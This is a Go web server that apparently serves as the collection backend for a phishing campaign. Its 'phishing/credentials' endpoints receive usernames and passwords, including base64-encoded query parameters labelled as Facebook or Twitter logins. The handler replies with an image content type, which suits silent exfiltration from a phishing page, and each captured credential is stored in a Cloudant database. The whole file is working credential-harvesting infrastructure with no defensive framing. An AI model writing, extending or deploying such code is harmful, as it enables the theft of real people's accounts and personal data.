package main

import (
	"fmt"
	"github.com/labstack/echo"
	"github.com/labstack/echo/middleware"
	"github.com/IBM/cloudant-go-sdk/cloudantv1"
	"github.com/google/uuid"
	"encoding/json"
	"encoding/base64"
	"log"
	"net/http"
	"os"
	"time"
)

var (
	CLOUDANT_DB=os.Getenv("CLOUDANT_DB")
	SERVER_PORT=os.Getenv("PORT")
	SERVER_ACCESS_KEY=os.Getenv("ACCESS_KEY")
)

type Credentials struct {
	ID		string  `json:"id"`
	Username 	string	`json:"username"`
	Key		string	`json:"key"`
	Service		string	`json:"service"`
	Url		string	`json:"url"`
	Time		string	`json:"time"`
}

func StoreCredential(credential Credentials) error {
	credential.ID = fmt.Sprintf("credentials:%s", uuid.New().String())
	client, err := cloudantv1.NewCloudantV1UsingExternalConfig(
		&cloudantv1.CloudantV1Options{},
	)
	if err != nil {
		return err
	}
	doc := cloudantv1.Document{
		ID: &credential.ID,
	}
	doc.SetProperty("username", credential.Username)
	doc.SetProperty("key", credential.Key)
	doc.SetProperty("service", credential.Service)
	doc.SetProperty("url", credential.Url)
	doc.SetProperty("time", credential.Time)
	options := client.NewPostDocumentOptions(
		CLOUDANT_DB,
	).SetDocument(&doc)
	_, _, err = client.PostDocument(options)
	if err != nil {
		log.Printf("> Post Response Error: %v\n", err)
	}
	return err
}

func HandlePostCredentials(c echo.Context) error {
	credential := Credentials{Time: time.Now().String()}
	if (c.Request().Header.Get("AccessKey") != SERVER_ACCESS_KEY){
		log.Printf("> Unauthorized\n")
		return c.String(http.StatusUnauthorized, "{\"status\":\"unauthorized\"}")
	}
	defer c.Request().Body.Close()
	err := json.NewDecoder(c.Request().Body).Decode(&credential)
	if err != nil {
		log.Printf("> Error reading credential:\n%v\n", err)
		return echo.NewHTTPError(http.StatusInternalServerError, err.Error)
	}
	log.Printf("> Saving credential: \n%v\n", credential)
	err = StoreCredential(credential)
	if err != nil {
		log.Printf("> Error storing credential:\n%v\n", err)
		return echo.NewHTTPError(http.StatusInternalServerError, err.Error)
	}
	return c.String(http.StatusOK, "{\"status\":\"ok\"}")
}

func HandleGetCredentials(c echo.Context) error {
	credential := Credentials{Time: time.Now().String()}
	access_key, _ := base64.StdEncoding.DecodeString(c.QueryParam("a"))
	username, _ := base64.StdEncoding.DecodeString(c.QueryParam("u"))
	passwd, _ := base64.StdEncoding.DecodeString(c.QueryParam("k"))
	if (string(access_key) != SERVER_ACCESS_KEY){
		log.Printf("> Unauthorized\n")
		return c.String(http.StatusUnauthorized, "{\"status\":\"unauthorized\"}")
	}
	credential.Username = string(username)
	credential.Key = string(passwd)
	switch c.QueryParam("s") {
	case "1":
		credential.Service = "facebook"
	case "2":
		credential.Service = "twitter"
	default:
		credential.Service = "unknown"
	}
	log.Printf("> Saving credential: \n%v\n", credential)
	err := StoreCredential(credential)
	if err != nil {
		log.Printf("> Error storing credential:\n%v\n", err)
		return echo.NewHTTPError(http.StatusInternalServerError, err.Error)
	}
	c.Response().Header().Set("Content-Type", "image/jpeg")
	c.Response().WriteHeader(200)
	return nil
}


func main() {
	e := echo.New()
	e.Use(middleware.CORSWithConfig(middleware.CORSConfig{
		AllowOrigins: []string{"*"},
		AllowHeaders: []string{echo.HeaderOrigin, echo.HeaderContentType, echo.HeaderAccept, "AccessKey"},
	}))
	e.POST("phishing/credentials", HandlePostCredentials)
	e.GET("phishing/credentials", HandleGetCredentials)
	e.Logger.Fatal(e.Start(":" + SERVER_PORT))
}
